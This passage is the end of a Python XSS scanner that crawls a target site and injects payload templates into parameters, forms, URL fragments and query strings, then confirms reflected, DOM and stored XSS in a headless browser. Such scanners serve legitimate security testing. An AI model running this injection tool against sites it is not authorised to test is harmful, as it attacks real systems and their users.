            if confirmation_type == "Alert" and confirmation_detail:
                 match = re.search(f"({STORED_MARKER_PREFIX}_[a-f0-9]+)", confirmation_detail)
                 if match: extracted_marker = match.group(1)
            confirmed_dom_vulns.append({'type': 'DOM-based XSS (Confirmed - Hash)', 'url': url, 'source': 'URL Fragment (#)', 'payload': formatted_payload, 'payload_template': payload_template, 'marker': marker, 'confirmed': True, 'confirmation_type': confirmation_type, 'confirmation_detail': confirmation_detail, 'final_url': test_url, 'extracted_marker': extracted_marker })
    return confirmed_dom_vulns


# --- Crawler ---
def crawl(start_url, max_depth, session, driver, executor, payload_list_templates, delay):
    """Performs the initial crawl and scan phase."""
    # (Largely same as v10, calls updated DOM scan functions)
    if max_depth <= 0: max_depth = 1
    base_domain = urlparse(start_url).netloc
    if not base_domain: print(f"[!] Could not determine base domain for URL: {start_url}", file=sys.stderr); return [], set()
    queue = deque([(start_url, 0)]); visited = {start_url}; all_vulnerabilities_phase1 = []
    print("\n--- Phase 1: Crawling and Initial Scan (Reflected/DOM) ---")
    while queue:
        current_url, current_depth = queue.popleft()
        print(f"\n--- Scanning URL: {current_url} (Depth: {current_depth}) ---")
        if current_depth >= max_depth: continue
        if delay > 0: print(f"[*] Delaying for {delay} second(s)..."); time.sleep(delay)

        # --- Scan for Context-Aware Reflected XSS ---
        confirmed_reflected = scan_page_reflected_context_aware(current_url, session, driver, executor, payload_list_templates)
        all_vulnerabilities_phase1.extend(confirmed_reflected)

        # --- Scan for DOM XSS (Hash Source + Query Source with Confirmation) ---
        if driver:
             confirmed_dom_hash = scan_dom_source_hash(current_url, driver, payload_list_templates)
             all_vulnerabilities_phase1.extend(confirmed_dom_hash)
             # Query source scan now attempts confirmation internally
             confirmed_dom_query = scan_dom_source_query(current_url, driver, executor, payload_list_templates) # Pass templates for confirmation step
             all_vulnerabilities_phase1.extend(confirmed_dom_query)
        else: print("[*] Skipping DOM XSS checks as headless browser is disabled.")

        # --- Find Links ---
        if current_depth < max_depth - 1:
            print(f"[*] Discovering links on {current_url}...")
            new_links = get_links(current_url, session, base_domain); added_count = 0
            for link in new_links:
                if link not in visited: visited.add(link); queue.append((link, current_depth + 1)); added_count += 1
            if added_count > 0: print(f"  - Added {added_count} new links to queue (Depth {current_depth + 1})")

    print(f"\n[*] Phase 1 Crawl finished. Visited {len(visited)} unique URLs.")
    return all_vulnerabilities_phase1, visited


# --- Stored XSS Verification Phase ---
# verify_stored_xss remains the same as v9
def verify_stored_xss(visited_urls, driver, delay):
    """Re-visits discovered URLs to check for stored XSS execution and correlate."""
    if not driver: print("[!] Skipping Stored XSS verification phase (headless browser disabled)."); return []
    print(f"\n--- Phase 2: Stored XSS Verification (Re-visiting {len(visited_urls)} URLs) ---")
    correlated_stored_vulns = []
    for i, url in enumerate(visited_urls):
        print(f"[*] Checking URL ({i+1}/{len(visited_urls)}) for stored execution: {url}")
        if delay > 0: time.sleep(delay)
        confirmation_type, confirmation_detail = confirm_xss_with_headless(url, driver, payload_description="Stored XSS Check")
        if confirmation_type == "Alert" and confirmation_detail:
            match = re.search(f"({STORED_MARKER_PREFIX}_[a-f0-9]+)", confirmation_detail)
            if match:
                extracted_marker = match.group(1); print(f"  [!] Marker found in alert: {extracted_marker}")
                original_submission = marker_to_submission.get(extracted_marker)
                if original_submission:
                    print(f"  [***] Correlated Stored XSS Found!")
                    correlated_stored_vulns.append({'type': 'Stored XSS (Correlated)', 'url': url, 'payload': format_payload(original_submission['payload_template'], extracted_marker), 'payload_template': original_submission['payload_template'], 'marker': extracted_marker, 'confirmed': True, 'confirmation_type': confirmation_type, 'confirmation_detail': confirmation_detail, 'final_url': url, 'original_submission': original_submission })
                else:
                    print(f"  [!] Found marker {extracted_marker} but no matching submission log entry!")
                    correlated_stored_vulns.append({'type': 'Stored XSS (Potential - Uncorrelated Marker)', 'url': url, 'payload': 'Unknown', 'confirmed': True, 'confirmation_type': confirmation_type, 'confirmation_detail': confirmation_detail, 'final_url': url})
            else:
                 print(f"  [!] Potential Stored XSS detected (Alert confirmed, no marker): {url}")
                 correlated_stored_vulns.append({'type': 'Stored XSS (Potential - No Marker)', 'url': url, 'payload': 'Unknown', 'confirmed': True, 'confirmation_type': confirmation_type, 'confirmation_detail': confirmation_detail, 'final_url': url})
        elif confirmation_type == "DOM Change":
             print(f"  [!] Potential Stored XSS detected (DOM change confirmed, no correlation): {url}")
             correlated_stored_vulns.append({'type': 'Stored XSS (Potential - DOM Change)', 'url': url, 'payload': 'Unknown', 'confirmed': True, 'confirmation_type': confirmation_type, 'confirmation_detail': confirmation_detail, 'final_url': url})
    print(f"[*] Phase 2 Stored XSS Verification finished. Found {len(correlated_stored_vulns)} potential/correlated instances.")
    return correlated_stored_vulns


# --- Entry Point ---
if __name__ == "__main__":
    # Argument parsing remains the same as v11
    parser = argparse.ArgumentParser(description="XSS Scanner v12 (Confirmed Query Param DOM) - Use Responsibly!")
    parser.add_argument("url", help="The starting URL to scan")
    parser.add_argument("-d", "--depth", type=int, default=2, help="Maximum crawl depth (default: 2)")
    parser.add_argument("--no-headless", action="store_true", help="Disable headless browser confirmation AND context-aware/DOM/Stored checks")
    parser.add_argument("-w", "--workers", type=int, default=MAX_WORKERS, help=f"Number of concurrent workers (default: {MAX_WORKERS})")
    parser.add_argument("-pL", "--payload-list", help="Path to payload file (templates/static payloads)")
    parser.add_argument("--delay", type=float, default=0, help="Delay in seconds between page scans (default: 0)")
    parser.add_argument("--skip-stored-check", action="store_true", help="Skip the phase 2 stored XSS verification crawl")

    args = parser.parse_args(); target_url = args.url; max_depth = args.depth; use_headless = not args.no_headless
    num_workers = args.workers; payload_file = args.payload_list; request_delay = args.delay; skip_stored = args.skip_stored_check

    if request_delay < 0: print("[!] Delay cannot be negative. Setting to 0.", file=sys.stderr); request_delay = 0

    # Load payloads
    payload_templates_to_use = DEFAULT_PAYLOADS
    if payload_file:
        loaded_payloads = load_payloads(payload_file)
        if loaded_payloads: payload_templates_to_use = loaded_payloads
        else: print("[!] Failed to load payloads from file, using default list.", file=sys.stderr)
    else: print("[*] No payload list provided, using default list.")

    # Define which payload templates are candidates for stored XSS logging
    STORED_CANDIDATE_PAYLOADS = [p for p in payload_templates_to_use if "{marker}" in p]
    if not STORED_CANDIDATE_PAYLOADS:
         print("[!] Warning: No payload templates with '{marker}' found. Stored XSS correlation will likely fail.", file=sys.stderr)

    # Setup Selenium Driver
    driver = None
    if use_headless:
        print("[*] Setting up headless browser (Selenium)...")
        driver = setup_driver()
        if not driver: print("[!] Proceeding without headless features."); use_headless = False
    else: print("[*] Headless features disabled via command line.")

    # Use a session object
    session = requests.Session(); session.headers.update({'User-Agent': 'XSSScanner/1.2 (+https://github.com/your-repo)'}) # Update version

    start_time = time.time()
    all_confirmed_vulns = []
    visited_urls_for_stored_check = set()

    # --- Phase 1: Initial Crawl & Scan ---
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
        phase1_vulns, visited_urls_for_stored_check = crawl(target_url, max_depth, session, driver, executor, payload_templates_to_use, request_delay)
        all_confirmed_vulns.extend(phase1_vulns)

    # --- Phase 2: Stored XSS Verification ---
    if not skip_stored and use_headless and visited_urls_for_stored_check:
        potential_stored = verify_stored_xss(visited_urls_for_stored_check, driver, request_delay)
        all_confirmed_vulns.extend(potential_stored)
    elif skip_stored: print("\n[*] Skipping Phase 2 Stored XSS verification as requested.")
    elif not use_headless: print("\n[*] Skipping Phase 2 Stored XSS verification (requires headless browser).")

    end_time = time.time()

    # --- Reporting ---
    print("\n--- Scan Summary ---")
    if all_confirmed_vulns:
        print(f"\n[***] Found {len(all_confirmed_vulns)} XSS vulnerabilities (Reflected/DOM/Stored):")
        all_confirmed_vulns.sort(key=lambda x: (x['url'], x['type']))
        for vuln in all_confirmed_vulns:
             display_payload = str(vuln.get('payload', 'N/A')) # Ensure payload is string
             display_payload = display_payload[:80] + '...' if len(display_payload) > 80 else display_payload
             display_confirm_detail = str(vuln.get('confirmation_detail', 'N/A')) # Ensure detail is string
             if len(display_confirm_detail) > 60: display_confirm_detail = display_confirm_detail[:57] + '...'

             base_info = f"Type: {vuln['type']}, Confirm: {vuln.get('confirmation_type', 'N/A')} ({display_confirm_detail}), Payload: {display_payload}"

             if vuln['type'] == 'URL Parameter':
                 print(f"  - URL: {vuln['url']}, Param: {vuln['parameter']}, {base_info}, Final URL: {vuln['final_url']}")
             elif vuln['type'] == 'Form Input':
                  print(f"  - URL: {vuln['url']}, Form Action: {vuln['action']}, Method: {vuln['method']}, Fields: {vuln['fields']}, {base_info}, Final URL: {vuln['final_url']}")
             elif vuln['type'] == 'DOM-based XSS (Confirmed - Hash)': # Renamed for clarity
                  print(f"  - URL: {vuln['url']}, Source: {vuln['source']}, {base_info}, Trigger URL: {vuln['final_url']}")
             elif vuln['type'] == 'DOM-based XSS (Confirmed - Query Param)': # New confirmed type
                  print(f"  - URL: {vuln['url']}, Source: {vuln['source']}, Sink Hint: {vuln.get('sink_detected', 'N/A')}, {base_info}, Trigger URL: {vuln['final_url']}")
             elif vuln['type'] == 'DOM-based XSS (Potential)': # Sink check only
                  print(f"  - URL: {vuln['url']}, Source: {vuln['source']}, Confirm: {vuln.get('confirmation_type', 'N/A')}, Marker: {display_payload}")
             elif vuln['type'] == 'Stored XSS (Correlated)':
                  orig_sub = vuln.get('original_submission', {})
                  orig_ctx = orig_sub.get('context', 'N/A'); orig_url = orig_sub.get('submit_url', 'N/A'); orig_details = orig_sub.get('details', {})
                  print(f"  - URL: {vuln['url']}, {base_info}")
                  print(f"    -> Correlated to submission: URL='{orig_url}', Context='{orig_ctx}', Details='{orig_details}', Marker='{vuln.get('marker')}'")
             elif 'Stored XSS (Potential' in vuln['type']:
                  print(f"  - URL: {vuln['url']}, {base_info} (Correlation N/A)")
             else: print(f"  - {vuln}") # Fallback for any other types
    else:
        print("\n[*] No vulnerabilities confirmed via headless browser during any phase.")
        if not use_headless: print("    (Headless confirmation and related checks were disabled.)")

    print(f"\n--- Scan Finished in {end_time - start_time:.2f} seconds ---")

    # Cleanup
    if driver: print("[*] Closing headless browser..."); driver.quit()

